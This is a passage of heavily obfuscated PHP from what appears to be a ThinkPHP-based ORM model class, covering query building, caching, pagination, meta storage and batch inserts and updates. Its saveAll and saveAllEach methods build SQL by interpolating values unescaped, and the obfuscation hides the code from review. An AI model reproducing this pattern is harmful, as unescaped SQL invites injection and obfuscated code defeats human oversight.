$½÷¦™¬Ò = get_object_vars($½÷¦™¬Ò); } if (is_string($½÷¦™¬Ò)) { $Í„Ÿ•ÈÜ = $½÷¦™¬Ò; } elseif (is_array($½÷¦™¬Ò)) { if (isset($½÷¦™¬Ò[0])) { $this->options[$ç„ùâé‘[400]] = array_merge($this->options[$ç„ùâé‘[400]], $½÷¦™¬Ò); return $this; } else { $Í„Ÿ•ÈÜ = $½÷¦™¬Ò; } } else { think_exception(think_lang($ç„ùâé‘[324])); } $this->options[$ç„ùâé‘[400]][] = $Í„Ÿ•ÈÜ; return $this; } public function cache($±«¤«ßİ = true, $»¨³“»İ = null, $¼ÛŸõÌä = '') { $ùÇ”µÓÁ =& $_SERVER[‚ûòÉ˜ş]; if (!1 !== $±«¤«ßİ) { $this->options[$ùÇ”µÓÁ[402]] = array($ùÇ”µÓÁ[104] => $±«¤«ßİ, $ùÇ”µÓÁ[392] => $»¨³“»İ, $ùÇ”µÓÁ[43] => $¼ÛŸõÌä); } return $this; } public function field($Å¸šÕ™·, $‚¿ÑÔ²Ş = false) { $ıûÀ´¥‰ =& $_SERVER[‚ûòÉ˜ş]; if (!0 === $Å¸šÕ™·) { $¼úúã‹± = $this->getDbFields(); $Å¸šÕ™· = $¼úúã‹± ? $¼úúã‹± : $ıûÀ´¥‰[213]; } elseif ($‚¿ÑÔ²Ş) { if (is_string($Å¸šÕ™·)) { $Å¸šÕ™· = explode($ıûÀ´¥‰[60], $Å¸šÕ™·); } $¼úúã‹± = $this->getDbFields(); $Å¸šÕ™· = $¼úúã‹± ? array_diff($¼úúã‹±, $Å¸šÕ™·) : $Å¸šÕ™·; } $this->options[$ıûÀ´¥‰[326]] = $Å¸šÕ™·; return $this; } public function scope($ÒšÂ§åÉ = '', $ÂñœÎšá = NULL) { $¨“Â³Ï =& $_SERVER[‚ûòÉ˜ş]; if ($¨“Â³Ï[12] === $ÒšÂ§åÉ) { if (isset($this->_scope[$¨“Â³Ï[47]])) { $Í¼â·€ = $this->_scope[$¨“Â³Ï[47]]; } else { return $this; } } elseif (is_string($ÒšÂ§åÉ)) { $éóù²ïÓ = explode($¨“Â³Ï[60], $ÒšÂ§åÉ); $Í¼â·€ = array(); foreach ($éóù²ïÓ as $é İğçŒ) { if (!isset($this->_scope[$é İğçŒ])) { continue; } $Í¼â·€ = array_merge($Í¼â·€, $this->_scope[$é İğçŒ]); } if (!empty($ÂñœÎšá) && is_array($ÂñœÎšá)) { $Í¼â·€ = array_merge($Í¼â·€, $ÂñœÎšá); } } elseif (is_array($ÒšÂ§åÉ)) { $Í¼â·€ = $ÒšÂ§åÉ; } if (is_array($Í¼â·€) && !empty($Í¼â·€)) { $this->options = array_merge($this->options, array_change_key_case($Í¼â·€)); } return $this; } public function where($ò—àá—é, $“ÕÍ©³® = null) { $›‡µ£áÖ =& $_SERVER[‚ûòÉ˜ş]; if (!is_null($“ÕÍ©³®) && is_string($ò—àá—é)) { if (!is_array($“ÕÍ©³®)) { $“ÕÍ©³® = func_get_args(); array_shift($“ÕÍ©³®); } $“ÕÍ©³® = array_map(array($this->db, $›‡µ£áÖ[396]), $“ÕÍ©³®); $ò—àá—é = vsprintf($ò—àá—é, $“ÕÍ©³®); } elseif (is_object($ò—àá—é)) { $ò—àá—é = get_object_vars($ò—àá—é); } elseif (is_array($ò—àá—é)) { foreach ($ò—àá—é as $É‰ÃåäÃ => $£–Éı) { if ((is_numeric($É‰ÃåäÃ) || !$É‰ÃåäÃ) && is_string($£–Éı)) { if (strpos($£–Éı, $›‡µ£áÖ[403]) === 0) { continue; } think_trace($›‡µ£áÖ[404], $›‡µ£áÖ[12], $›‡µ£áÖ[59]); die; } } } if (is_string($ò—àá—é) && $›‡µ£áÖ[12] != $ò—àá—é) { $Ä»×ä‰ = array(); $Ä»×ä‰[$›‡µ£áÖ[405]] = $ò—àá—é; $ò—àá—é = $Ä»×ä‰; } if (isset($this->options[$›‡µ£áÖ[328]])) { $this->options[$›‡µ£áÖ[328]] = array_merge($this->options[$›‡µ£áÖ[328]], $ò—àá—é); } else { $this->options[$›‡µ£áÖ[328]] = $ò—àá—é; } return $this; } public function limit($–¯íê¬Ò, $ª¾·ÜµÃ = null) { $«¢‹‹ÓÇ =& $_SERVER[‚ûòÉ˜ş]; $this->options[$«¢‹‹ÓÇ[345]] = is_null($ª¾·ÜµÃ) ? $–¯íê¬Ò : $–¯íê¬Ò . $«¢‹‹ÓÇ[60] . $ª¾·ÜµÃ; return $this; } public function page($ÏÄÁÖÇ¬, $ø³†â‰ = null) { $Ä‡Úü½ =& $_SERVER[‚ûòÉ˜ş]; $this->options[$Ä‡Úü½[406]] = is_null($ø³†â‰) ? $ÏÄÁÖÇ¬ : $ÏÄÁÖÇ¬ . $Ä‡Úü½[60] . $ø³†â‰; return $this; } public function comment($ÙŒº‰ª¼) { $this->options[$_SERVER[‚ûòÉ˜ş][407]] = $ÙŒº‰ª¼; return $this; } public function setProperty($½£¡Ê, $øÚîïÏ) { if (property_exists($this, $½£¡Ê)) { $this->{$½£¡Ê} = $øÚîïÏ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\x66\x79\124\151\x6d\x65", "\164\151\x6d\145", "\x69\x6e\x73\x65\162\164\x2c\x75\160\x64\x61\x74\x65", "\146\165\x6e\143\164\x69\x6f\x6e"), array("\x63\x72\x65\x61\164\x65\124\151\x6d\x65", "\164\151\155\x65", "\x69\156\x73\145\162\164", "\x66\165\x6e\x63\x74\151\x6f\x6e")); public function setDataAuto($ë˜Èı’›) { $this->dataAuto = $ë˜Èı’›; } public function __construct($ûŒˆ¡±Ø = '', $œÌÇÅ×“ = '', $˜ˆµ¢Å = '') { parent::__construct($ûŒˆ¡±Ø, $œÌÇÅ×“, $˜ˆµ¢Å); } protected $tableMeta = array(); protected function _beforeInsert(&$¹ûãæ µ, $–İÛƒÜ·) { $Ûó¦ÚĞ™ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->checkDataAutoHas($Ûó¦ÚĞ™[408])) { return; } $this->dataBeforeFilter($¹ûãæ µ, $Ûó¦ÚĞ™[408]); } protected function _beforeUpdate(&$ÂûèÚºÎ, $èÚ›‹ ú) { $àŠÌŞãç =& $_SERVER[‚ûòÉ˜ş]; if (!$this->checkDataAutoHas($àŠÌŞãç[409])) { return; } $this->dataBeforeFilter($ÂûèÚºÎ, $àŠÌŞãç[409]); } protected function _afterSelect(&$ªúÌîó , $âàûäÌ‡) { if (!is_array($ªúÌîó )) { return; } if (!$this->checkDataAutoHas($_SERVER[‚ûòÉ˜ş][410])) { return; } foreach ($ªúÌîó  as &$ô¥ü€–) { $this->dataAfterFilter($ô¥ü€–); } unset($ô¥ü€–); } protected function _afterFind(&$áãòŞ‹ü, $—–®«×) { if (!is_array($áãòŞ‹ü)) { return; } if (!$this->checkDataAutoHas($_SERVER[‚ûòÉ˜ş][410])) { return; } $this->dataAfterFilter($áãòŞ‹ü); } public static function textEncode($÷‹Ì¶êÍ) { if (!$÷‹Ì¶êÍ) { return $÷‹Ì¶êÍ; } $ú’ Ù¡  = json_encode($÷‹Ì¶êÍ); $ú’ Ù¡  = preg_replace_callback($_SERVER[‚ûòÉ˜ş][411], function ($·ÍàÚ›•) { return addslashes($·ÍàÚ›•[0]); }, $ú’ Ù¡ ); return json_decode($ú’ Ù¡ ); } public static function textDecode($ Õ­âÍÃ) { $¥ªïÈÜ =& $_SERVER[‚ûòÉ˜ş]; $†Üòñó = json_encode($ Õ­âÍÃ); $†Üòñó = preg_replace_callback($¥ªïÈÜ[412], function ($ÚÂç¹´Ì) { return $_SERVER[‚ûòÉ˜ş][107]; }, $†Üòñó); return json_decode($†Üòñó); } public function setAutoIncrement($ºƒıÊ‹Å) { $‘£„ã¥ó = array($this->getPk() => $ºƒıÊ‹Å); $¢Ó‰ÌËÛ = $this->data($‘£„ã¥ó)->add(); if ($¢Ó‰ÌËÛ) { $this->delete($¢Ó‰ÌËÛ); } } public function getAutoIncrement() { $Ÿäº‘‚ = $this->getTableName(); $Ô¡„ù¬ä = $this->max($this->getPk()); $ÉÆ¬¤îŠ = $this->query("\x73\150\157\x77\40\164\x61\142\x6c\145\x20\x73\x74\141\x74\x75\x73\x20\x77\150\145\162\x65\40\116\x61\x6d\145\75\x27{$Ÿäº‘‚}\x27"); $™øşâË° = $ÉÆ¬¤îŠ[0][$_SERVER[‚ûòÉ˜ş][413]]; $’¾–Ï²· = max($Ô¡„ù¬ä, $™øşâË°); return $’¾–Ï²·; } protected function _callBefore($îÊ¬ŸŞ, $èöø§ÏÓ) { return $this->cacheCallCheck($îÊ¬ŸŞ, $èöø§ÏÓ, !1); } protected function _callAfter($ı¹í¹·¬, $Éûª¿Á) { return $this->cacheCallCheck($ı¹í¹·¬, $Éûª¿Á, !0); } protected function cacheFunctionAlias($¸Ğ”µè) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÅšĞ°ôı, $Ò›ÀÍâ, $Ï›Üøô = false) { $úâ§œ³ = $this->cacheFunctionAlias($Ò›ÀÍâ); if (!$úâ§œ³) { return; } foreach ($úâ§œ³ as $³Í°™öÚ => $ÅÆÅšÇÖ) { $øÕ¤€Ì = $ÅÆÅšÇÖ[0]; $÷šëËæÂ = explode($_SERVER[‚ûòÉ˜ş][60], $ÅÆÅšÇÖ[1]); if ($ÅšĞ°ôı == $³Í°™öÚ) { return $this->cacheFunctionGet($³Í°™öÚ, $øÕ¤€Ì); } if ($Ï›Üøô && in_array($ÅšĞ°ôı, $÷šëËæÂ)) { $this->cacheFunctionClear($³Í°™öÚ, $øÕ¤€Ì); } } } public function cacheFunctionGet($Ö—²±¨, $Ú’ãÄ¥Ò) { $€™„Ã÷ô = $this->cacheKeyMake($Ö—²±¨, $Ú’ãÄ¥Ò); $£ Š¸§ş = Cache::get($€™„Ã÷ô); if (!is_array($£ Š¸§ş)) { $£ Š¸§ş = call_user_func_array(array($this, $Ö—²±¨), array($Ú’ãÄ¥Ò, !0)); Cache::set($€™„Ã÷ô, $£ Š¸§ş); } return $£ Š¸§ş; } public function cacheFunctionClear($™Ì¤ÜúË, $èòÕôòÏ) { $ø­šîµù = $èòÕôòÏ; if (!is_array($èòÕôòÏ)) { $ø­šîµù = array($èòÕôòÏ); } foreach ($ø­šîµù as $‹ò¦âÈ) { $ÚÄ…ı’± = $this->cacheKeyMake($™Ì¤ÜúË, $‹ò¦âÈ); Cache::remove($ÚÄ…ı’±); } } private function cacheKeyMake($„ŞºŒò€, $Àğ³ğäÅ) { $ Ç…–ˆ¬ =& $_SERVER[‚ûòÉ˜ş]; return get_class($this) . $ Ç…–ˆ¬[11] . $„ŞºŒò€ . $ Ç…–ˆ¬[414] . $Àğ³ğäÅ; } protected function selectPageReset() { $ã œşŸ =& $_SERVER[‚ûòÉ˜ş]; if (isset($GLOBALS[$ã œşŸ[415]])) { return; } $GLOBALS[$ã œşŸ[415]] = isset($GLOBALS[$ã œşŸ[7]][$ã œşŸ[416]]) ? $GLOBALS[$ã œşŸ[7]][$ã œşŸ[416]] : !1; $GLOBALS[$ã œşŸ[417]] = isset($GLOBALS[$ã œşŸ[7]][$ã œşŸ[406]]) ? $GLOBALS[$ã œşŸ[7]][$ã œşŸ[406]] : !1; $GLOBALS[$ã œşŸ[7]][$ã œşŸ[416]] = !1; $GLOBALS[$ã œşŸ[7]][$ã œşŸ[406]] = !1; } protected function selectPageRestore() { $Ú£‚Ç˜„ =& $_SERVER[‚ûòÉ˜ş]; if (!isset($GLOBALS[$Ú£‚Ç˜„[415]])) { return; } $GLOBALS[$Ú£‚Ç˜„[7]][$Ú£‚Ç˜„[416]] = $GLOBALS[$Ú£‚Ç˜„[415]]; $GLOBALS[$Ú£‚Ç˜„[7]][$Ú£‚Ç˜„[406]] = $GLOBALS[$Ú£‚Ç˜„[417]]; if ($GLOBALS[$Ú£‚Ç˜„[7]][$Ú£‚Ç˜„[416]] === !1) { unset($GLOBALS[$Ú£‚Ç˜„[7]][$Ú£‚Ç˜„[416]]); } if ($GLOBALS[$Ú£‚Ç˜„[7]][$Ú£‚Ç˜„[406]] === !1) { unset($GLOBALS[$Ú£‚Ç˜„[7]][$Ú£‚Ç˜„[406]]); } unset($GLOBALS[$Ú£‚Ç˜„[415]]); unset($GLOBALS[$Ú£‚Ç˜„[417]]); } protected function selectPage($ãÀƒÚ°¸ = 200, $è¶€şõ = 1) { $¹íˆïÚç =& $_SERVER[‚ûòÉ˜ş]; global $in; $Ÿä¿á›Á = $this->optionsValue(); $ËàÂ€¬Ñ = 50000; $ãÀƒÚ°¸ = isset($in[$¹íˆïÚç[416]]) && $in[$¹íˆïÚç[416]] ? $in[$¹íˆïÚç[416]] : $ãÀƒÚ°¸; if ($ãÀƒÚ°¸ === -1) { $in[$¹íˆïÚç[416]] = !1; $ËàÂ€¬Ñ = 100000000; $ãÀƒÚ°¸ = $ËàÂ€¬Ñ; } $¥†ªÌú = $Ÿä¿á›Á; $¥†ªÌú[$¹íˆïÚç[418]] = array(); $ãÀƒÚ°¸ = intval($ãÀƒÚ°¸); $ãÀƒÚ°¸ = $ãÀƒÚ°¸ <= 5 ? 5 : ($ãÀƒÚ°¸ >= $ËàÂ€¬Ñ ? $ËàÂ€¬Ñ : $ãÀƒÚ°¸); $è¶€şõ = intval(isset($in[$¹íˆïÚç[406]]) && $in[$¹íˆïÚç[406]] ? $in[$¹íˆïÚç[406]] : $è¶€şõ); $è¶€şõ = $è¶€şõ <= 1 ? 1 : $è¶€şõ; $â½†ïºë = array(); $„ïúŒ‘õ = 1; if ($è¶€şõ == 1 && $„ïúŒ‘õ) { $this->optionsValue($Ÿä¿á›Á); $â½†ïºë = $this->page($è¶€şõ, $ãÀƒÚ°¸)->select(); $±µ­õ”‚ = is_array($â½†ïºë) ? count($â½†ïºë) : 0; if ($±µ­õ”‚ < $ãÀƒÚ°¸) { $´ÇŸîıœ = 1; } else { $this->optionsValue($¥†ªÌú); $±µ­õ”‚ = intval($this->count()); $´ÇŸîıœ = ceil($±µ­õ”‚ / $ãÀƒÚ°¸); } } else { $this->optionsValue($¥†ªÌú); $±µ­õ”‚ = intval($this->count()); $´ÇŸîıœ = ceil($±µ­õ”‚ / $ãÀƒÚ°¸); $è¶€şõ = $è¶€şõ >= $´ÇŸîıœ ? $´ÇŸîıœ : $è¶€şõ; $this->optionsValue($Ÿä¿á›Á); $â½†ïºë = $this->page($è¶€şõ, $ãÀƒÚ°¸)->select(); } if (!is_array($â½†ïºë)) { $â½†ïºë = array(); } if ($´ÇŸîıœ == 1) { $±µ­õ”‚ = count($â½†ïºë); } $È®™ª±Ç = array($¹íˆïÚç[419] => array($¹íˆïÚç[420] => $±µ­õ”‚, $¹íˆïÚç[416] => $ãÀƒÚ°¸, $¹íˆïÚç[406] => $è¶€şõ, $¹íˆïÚç[421] => $´ÇŸîıœ), $¹íˆïÚç[422] => $â½†ïºë); return $È®™ª±Ç; } protected function checkLength($ó±ò¦Ô, $÷ÍÚ¾Ä = 0, $¿¶ìéŒŞ = '') { $Ãñ´…ÑÇ =& $_SERVER[‚ûòÉ˜ş]; $÷ÍÚ¾Ä = $÷ÍÚ¾Ä ? $÷ÍÚ¾Ä : 65536; if (!$ó±ò¦Ô || strlen($ó±ò¦Ô) < $÷ÍÚ¾Ä) { return; } $¿¶ìéŒŞ = $¿¶ìéŒŞ ? $¿¶ìéŒŞ . $Ãñ´…ÑÇ[81] : $Ãñ´…ÑÇ[12]; show_json($¿¶ìéŒŞ . LNG($Ãñ´…ÑÇ[423]) . "\50{$÷ÍÚ¾Ä}\x29", !1); } protected function metaSet($À«©Ï“˜, $ßÎ®Úï = null, $ÖóáØ¶ù = null) { $¬¬×ŠÛ” =& $_SERVER[‚ûòÉ˜ş]; if (!$this->tableMeta || !$À«©Ï“˜) { return !1; } $¤‚±şĞ = $this->tableMeta[$¬¬×ŠÛ”[424]]; $ÊŞŠáâö = $this->tableMeta[$¬¬×ŠÛ”[425]]; $Õ†°ÓÛš = Model($ÊŞŠáâö); $‘ ‡îÎ = array($¤‚±şĞ => $À«©Ï“˜, $¬¬×ŠÛ”[426] => $ßÎ®Úï); if (is_null($ßÎ®Úï)) { return $Õ†°ÓÛš->where(array($¤‚±şĞ => $À«©Ï“˜))->delete(); } if (is_null($ÖóáØ¶ù) && is_string($ßÎ®Úï)) { return $Õ†°ÓÛš->where($‘ ‡îÎ)->delete(); } $ù„´Ÿ×¦ = is_array($ßÎ®Úï) ? $ßÎ®Úï : array(); if (is_string($ßÎ®Úï)) { $ù„´Ÿ×¦[$ßÎ®Úï] = $ÖóáØ¶ù; } $÷ôØ¾‰ = array(); foreach ($ù„´Ÿ×¦ as $ô³ŒÓ«“ => $†Ûä§û) { if (is_null($†Ûä§û) && is_string($ô³ŒÓ«“)) { $Õ†°ÓÛš->where(array($¤‚±şĞ => $À«©Ï“˜, $¬¬×ŠÛ”[426] => $ô³ŒÓ«“))->delete(); continue; } $this->checkLength($†Ûä§û, !1, $ÊŞŠáâö . $¬¬×ŠÛ”[4] . $ô³ŒÓ«“); $÷ôØ¾‰[] = array($¤‚±şĞ => $À«©Ï“˜, $¬¬×ŠÛ”[104] => $ô³ŒÓ«“, $¬¬×ŠÛ”[427] => $†Ûä§û); } $áÎü®ı÷ = $¬¬×ŠÛ”[428] . $ÊŞŠáâö; CacheLock::lock($áÎü®ı÷); $Õ†°ÓÛš->where(array($¤‚±şĞ => $À«©Ï“˜))->addAll($÷ôØ¾‰, array(), !0); CacheLock::unlock($áÎü®ı÷); return !0; } public function metaGet($Õ¡Ô®Ê, $º½ºÃ = false) { $ºõ¼ø»Ñ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->tableMeta) { return array(); } $µšáõôÙ = $this->tableMeta[$ºõ¼ø»Ñ[424]]; $³’¸Ï = Model($this->tableMeta[$ºõ¼ø»Ñ[425]]); if ($º½ºÃ) { $ÈåªÀ… = array($µšáõôÙ => $Õ¡Ô®Ê, $ºõ¼ø»Ñ[104] => $º½ºÃ); return $³’¸Ï->where($ÈåªÀ…)->getField($ºõ¼ø»Ñ[427]); } $ÈåªÀ… = array($µšáõôÙ => $Õ¡Ô®Ê); $¸™úíÜÚ = $³’¸Ï->field($ºõ¼ø»Ñ[429])->where($ÈåªÀ…)->select(); $¸™úíÜÚ = array_to_keyvalue($¸™úíÜÚ, $ºõ¼ø»Ñ[104], $ºõ¼ø»Ñ[427]); return $¸™úíÜÚ; } private function checkDataAutoHas($Åùî³Ö) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ş€ø·Ö€) { if (in_array($Åùî³Ö, explode($_SERVER[‚ûòÉ˜ş][60], $ş€ø·Ö€[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ØÜ²·², $Å ½ğùÔ) { $¯à…ü´± =& $_SERVER[‚ûòÉ˜ş]; if (!is_array($ØÜ²·²)) { return; } foreach ($this->dataAuto as $â¹¯‰Ìò) { $µ—¦ŸŸª = $â¹¯‰Ìò[0]; if (!in_array($Å ½ğùÔ, explode($¯à…ü´±[60], $â¹¯‰Ìò[2]))) { continue; } switch (trim($â¹¯‰Ìò[3])) { case $¯à…ü´±[374]: case $¯à…ü´±[375]: $‘ıŸ›áú = $â¹¯‰Ìò[1]; $Ú‡¥€Òœ = isset($â¹¯‰Ìò[4]) ? (array) $â¹¯‰Ìò[4] : array(); if ($‘ıŸ›áú == $¯à…ü´±[204] && array_key_exists($µ—¦ŸŸª, $ØÜ²·²)) { if (!$ØÜ²·²[$µ—¦ŸŸª]) { unset($ØÜ²·²[$µ—¦ŸŸª]); } break; } if (isset($ØÜ²·²[$µ—¦ŸŸª])) { array_unshift($Ú‡¥€Òœ, $ØÜ²·²[$µ—¦ŸŸª]); } if ($¯à…ü´±[374] == $â¹¯‰Ìò[3]) { $ØÜ²·²[$µ—¦ŸŸª] = call_user_func_array($‘ıŸ›áú, $Ú‡¥€Òœ); } else { $ØÜ²·²[$µ—¦ŸŸª] = call_user_func_array(array(&$this, $‘ıŸ›áú), $Ú‡¥€Òœ); } break; case $¯à…ü´±[323]: if (isset($ØÜ²·²[$µ—¦ŸŸª]) && $ØÜ²·²[$µ—¦ŸŸª]) { $ØÜ²·²[$µ—¦ŸŸª] = call_user_func_array(array(&$this, $â¹¯‰Ìò[1]), array($ØÜ²·²[$µ—¦ŸŸª])); } break; case $¯à…ü´±[326]: $ØÜ²·²[$µ—¦ŸŸª] = $ØÜ²·²[$â¹¯‰Ìò[1]]; break; case $¯à…ü´±[347]: if (isset($ØÜ²·²[$µ—¦ŸŸª]) && !is_string($ØÜ²·²[$µ—¦ŸŸª])) { $ØÜ²·²[$µ—¦ŸŸª] = json_encode_force($ØÜ²·²[$µ—¦ŸŸª]); } break; case $¯à…ü´±[376]: if ($ØÜ²·²[$µ—¦ŸŸª] === $¯à…ü´±[12]) { unset($ØÜ²·²[$µ—¦ŸŸª]); } break; case $¯à…ü´±[377]: $ØÜ²·²[$µ—¦ŸŸª] = $â¹¯‰Ìò[1]; default: break; } } if ($Å ½ğùÔ == $¯à…ü´±[408]) { $âå¢»õœ = strtolower($this->db->getDbType()); if (strpos($âå¢»õœ, $¯à…ü´±[23]) !== 0) { return; } $•×ıËú = $this->field(!0)->fields; $ã‘‡ÀˆÉ = $•×ıËú[$¯à…ü´±[305]]; if (isset($•×ıËú[$¯à…ü´±[304]])) { unset($ã‘‡ÀˆÉ[$•×ıËú[$¯à…ü´±[304]]]); } foreach ($ã‘‡ÀˆÉ as $øÒüò¬ú => $Å ½ğùÔ) { if (!isset($ØÜ²·²[$øÒüò¬ú])) { $ØÜ²·²[$øÒüò¬ú] = $¯à…ü´±[12]; } } } } private function dataAfterFilter(&$¸ºº“ñ×) { $ÚÈóÖàñ =& $_SERVER[‚ûòÉ˜ş]; foreach ($this->dataAuto as $ÇÌ†·²È) { $À™‚ğóÙ = $ÇÌ†·²È[0]; if (!isset($¸ºº“ñ×[$À™‚ğóÙ])) { continue; } if (!in_array($ÚÈóÖàñ[410], explode($ÚÈóÖàñ[60], $ÇÌ†·²È[2]))) { continue; } switch (trim($ÇÌ†·²È[3])) { case $ÚÈóÖàñ[374]: case $ÚÈóÖàñ[375]: $•óÏĞ­ò = isset($ÇÌ†·²È[4]) ? (array) $ÇÌ†·²È[4] : array(); array_unshift($•óÏĞ­ò, $¸ºº“ñ×[$À™‚ğóÙ]); if (isset($ÇÌ†·²È[4]) && $ÇÌ†·²È[4] == $ÚÈóÖàñ[430]) { $•óÏĞ­ò = array($¸ºº“ñ×[$À™‚ğóÙ]); } if ($ÚÈóÖàñ[374] == $ÇÌ†·²È[3]) { $¸ºº“ñ×[$À™‚ğóÙ] = call_user_func_array($ÇÌ†·²È[1], $•óÏĞ­ò); } else { $¸ºº“ñ×[$À™‚ğóÙ] = call_user_func_array(array(&$this, $ÇÌ†·²È[1]), $•óÏĞ­ò); } break; case $ÚÈóÖàñ[323]: if (isset($¸ºº“ñ×[$À™‚ğóÙ]) && $¸ºº“ñ×[$À™‚ğóÙ]) { $¸ºº“ñ×[$À™‚ğóÙ] = call_user_func_array(array(&$this, $ÇÌ†·²È[1]), array($¸ºº“ñ×[$À™‚ğóÙ])); } break; case $ÚÈóÖàñ[326]: $¸ºº“ñ×[$À™‚ğóÙ] = $¸ºº“ñ×[$ÇÌ†·²È[1]]; break; case $ÚÈóÖàñ[347]: $ê¸ö¡‹ = $¸ºº“ñ×[$À™‚ğóÙ]; $¸ºº“ñ×[$À™‚ğóÙ] = json_decode($ê¸ö¡‹, !0); if (is_null($¸ºº“ñ×[$À™‚ğóÙ])) { $¸ºº“ñ×[$À™‚ğóÙ] = $ê¸ö¡‹; } break; case $ÚÈóÖàñ[376]: if ($¸ºº“ñ×[$À™‚ğóÙ] === $ÚÈóÖàñ[12]) { unset($¸ºº“ñ×[$À™‚ğóÙ]); } break; case $ÚÈóÖàñ[377]: $¸ºº“ñ×[$À™‚ğóÙ] = $ÇÌ†·²È[1]; break; default: break; } } } public function saveAll($şÑËÒÔ¼) { $Òø¾½ï =& $_SERVER[‚ûòÉ˜ş]; $Ë„Ú•›Ê = $this->tablePrefix . $this->tableName; $Ñ‚“–½î = self::SQL_WHERE_IN_CHUNK; $şÑËÒÔ¼ = is_array($şÑËÒÔ¼) ? $şÑËÒÔ¼ : array(); $¸Õ¢³‡‘ = $Òø¾½ï[22]; $ÀõºŸ¸µ = 0; $¬ñ†ìšÓ = array(); $åÅÖ¡±£ = count($şÑËÒÔ¼); for ($Ë²Á‹ÀŞ = 0; $Ë²Á‹ÀŞ < $åÅÖ¡±£; $Ë²Á‹ÀŞ++) { $›²‘÷û = $şÑËÒÔ¼[$Ë²Á‹ÀŞ]; if (!is_array($›²‘÷û) || count($›²‘÷û) != 4) { continue; } $ªëüßÓ = "\x55\120\104\101\x54\x45\40\x60{$Ë„Ú•›Ê}\140\40\123\105\124\40{$›²‘÷û[2]}\x20\x3d\x20\x43\101\x53\x45\x20{$›²‘÷û[0]}\40\xa"; if ($ÀõºŸ¸µ == 0) { $¸Õ¢³‡‘ = $ªëüßÓ; } $¬ñ†ìšÓ[] = $Òø¾½ï[128] . $›²‘÷û[1] . $Òø¾½ï[128]; $ÀõºŸ¸µ++; $¸Õ¢³‡‘ .= "\x20\x57\110\x45\116\40\x27{$›²‘÷û[1]}\47\40\x54\x48\105\116\x20\x27{$›²‘÷û[3]}\x27\40\12"; if ($ÀõºŸ¸µ == $Ñ‚“–½î || $Ë²Á‹ÀŞ == $åÅÖ¡±£ - 1) { $”€Øåí„ = implode($Òø¾½ï[60], $¬ñ†ìšÓ); $¸Õ¢³‡‘ .= "\x20\105\116\x44\40\x20\127\x48\105\122\105\x20{$›²‘÷û[0]}\40\x49\116\40\50{$”€Øåí„}\51\40"; $this->execute($¸Õ¢³‡‘); $ÀõºŸ¸µ = 0; $¸Õ¢³‡‘ = $ªëüßÓ; $this->chunkEventCheck(count($¬ñ†ìšÓ)); $¬ñ†ìšÓ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÔÖÉàïø) { $Á¤ Î†Í =& $_SERVER[‚ûòÉ˜ş]; $ˆ ˆªÂ = $this->tablePrefix . $this->tableName; foreach ($ÔÖÉàïø as $™«ùÓºô) { if (!is_array($™«ùÓºô) || count($™«ùÓºô) != 4) { continue; } $å¡±«öõ = $™«ùÓºô[0] . $Á¤ Î†Í[431] . $™«ùÓºô[1] . $Á¤ Î†Í[128]; $ó÷ô½­ = $™«ùÓºô[2] . $Á¤ Î†Í[431] . $™«ùÓºô[3] . $Á¤ Î†Í[128]; $™ğ½ñÔ = "\165\160\x64\141\x74\x65\x20{$ˆ ˆªÂ}\x20\163\145\164\40{$ó÷ô½­}\x20\167\x68\x65\162\x65\x20{$å¡±«öõ}\73"; $this->execute($™ğ½ñÔ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ù®¿îÉˆ = false, $£ßõöˆ = false) { $this->_chunkEvent = $Ù®¿îÉˆ; $this->_chunkEventParam = $£ßõöˆ; } private function chunkEventCheck($·ù§ØŒ) { if (!$this->_chunkEvent) { return; } $§Å¾å‹… = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $§Å¾å‹…[$_SERVER[‚ûòÉ˜ş][432]] = $·ù§ØŒ; Hook::trigger($this->_chunkEvent, $§Å¾å‹…); } public function addAll($’›’Û˜Ş, $²è·•€Ü = array(), $æ‹ÛŠ¤ª = false) { $Õ®©Ü’ =& $_SERVER[‚ûòÉ˜ş]; ignore_timeout(); $àèŸÁ­‘ = self::SQL_WHERE_IN_CHUNK; if (empty($’›’Û˜Ş)) { $this->error = think_lang($Õ®©Ü’[324]); return !1; } $²è·•€Ü = $this->_parseOptions($²è·•€Ü); foreach ($’›’Û˜Ş as $çà‹úÌ => $ëôè“‰ğ) { $’›’Û˜Ş[$çà‹úÌ] = $this->_facade($ëôè“‰ğ); $this->_beforeInsert($’›’Û˜Ş[$çà‹úÌ], $²è·•€Ü); } if (method_exists($this->db, $Õ®©Ü’[325])) { for ($°·Í£ÆØ = 0; $°·Í£ÆØ < count($’›’Û˜Ş); $°·Í£ÆØ += $àèŸÁ­‘) { $¦üœü‚Ö = array_slice($’›’Û˜Ş, $°·Í£ÆØ, $àèŸÁ­‘); if (!is_array($¦üœü‚Ö) || count($¦üœü‚Ö) == 0) { break; } $±£¦’›¸ = $this->db->insertAll($¦üœü‚Ö, $²è·•€Ü, $æ‹ÛŠ¤ª); $this->chunkEventCheck(count($¦üœü‚Ö)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($’›’Û˜Ş as $çà‹úÌ => $ëôè“‰ğ) { $±£¦’›¸ = $this->db->insert($ëôè“‰ğ, $²è·•€Ü, $æ‹ÛŠ¤ª); } $this->commit(); } if (!1 !== $±£¦’›¸) { $úÂ–×ã¦ = $this->getLastInsID(); if ($úÂ–×ã¦) { return $úÂ–×ã¦; } } return $±£¦’›¸; } public function save($˜§ÃÒŸ´ = '', $†‹‹šÙ÷ = array()) { $Ã‹İÄ“û =& $_SERVER[‚ûòÉ˜ş]; $ Â½›Éš = self::SQL_WHERE_IN_CHUNK; $‘¥ƒí£ = $this->optionsValue(); $ÃÀ„ï¿í = $this->findWhereField($‘¥ƒí£); if (!$ÃÀ„ï¿í) { return parent::save($˜§ÃÒŸ´, $†‹‹šÙ÷); } $Ş¿Ù¸çõ = 0; $Í©…¢ÈÇ = $‘¥ƒí£[$Ã‹İÄ“û[328]][$ÃÀ„ï¿í][1]; $Í©…¢ÈÇ = is_array($Í©…¢ÈÇ) ? $Í©…¢ÈÇ : array(); 